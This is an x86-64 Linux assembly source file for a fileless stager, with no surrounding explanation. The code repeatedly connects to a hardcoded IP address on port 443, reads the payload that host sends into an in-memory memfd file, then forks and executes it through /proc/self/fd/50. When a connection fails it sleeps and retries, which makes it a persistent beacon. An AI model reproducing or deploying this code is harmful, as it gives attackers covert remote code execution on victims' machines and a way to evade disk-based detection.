BITS 64

DELAY equ 	10
PORT equ 	0xbb01		; python -c "import socket; print '0x%04x' % socket.htons(443)"
HOST equ  	0xc689e6ad	; python -c 'import socket,struct; print hex(struct.unpack("<L", socket.inet_aton("173.230.137.198"))[0])'


connect:
	mov rax, 41 		; socket()
	mov rdi, 2		; AF_INET
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 0		; IPPROTO_IP
	syscall

	xchg r15, rax		; store socket

;;; setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, timeval)
	;; mov rax, 54
	;; mov rdi, r15
	;; mov rsi, 1
	;; mov rdx, 21
	;; mov rcx, rsp
	;; push 5
	;; mov rcx, rsp
	;; mov r8, 16
	;; syscall

	mov rax, 42		; connect()
	mov rdi, r15		; socket
	push HOST
	push word PORT
	push word 2
	mov rsi, rsp
	mov rdx, 16	        ; sizeof(sockaddr_in)
	syscall

	cmp rax, 0
	jne sleep	        ; sleep if connect() failed

fdloop:
	mov rax, 2		; open()
	mov r10, 0x00736c2f6e69622f	; 2f 62 69 6e 2f 2f 6c 73
	push r10
	mov rdi, rsp
	mov rsi, 0
	syscall

	cmp rax, 49
	jne fdloop

memfd:
	mov rax, 319		; memfd_create()
	push 0x44444444
	mov rdi, rsp
	mov rsi, 1
	syscall

	mov r14, rax		; store memfd

readloop:
	mov rax, 0		; read()
	mov rdi, r15
	sub rsp, 8192
	mov rsi, rsp
	mov rdx, 8192
	syscall

	mov r13, rax		; save byte count

	mov rax, 1		; write()
	mov rdi, r14
	mov rsi, rsp
	mov rdx, r13
	syscall

	cmp r13, 8192
	je readloop

execute:
	mov rax, 57		; fork()
	syscall

	cmp rax, 0
	jne sleep

	mov rax, 59		; execve()
	push 0
	mov r10, 0x30352f64662f666c
	push r10
	mov r10, 0x65732f636f72702f
	push r10
	mov rdi, rsp
	push 0
	push rdi
	mov rsi, rsp
	mov rdx, 0
	syscall

	mov rax, 60		; exit()
	mov rdi, 0
	syscall

sleep:
	mov r10, r15
closeloop:
	mov rax, 3
	mov rdi, r10
	syscall

	inc r10
	cmp r10, r14
	jne closeloop

	mov rax, 3		; close socket
	mov rdi, r15
	syscall

	mov rax, 3		; close memfd
	mov rdi, r14
	syscall

	mov rax, 35		; nanosleep
	push 0			; nsec
	push DELAY		; sleep DELAY seconds
	mov rdi, rsp
	syscall
	jmp connect
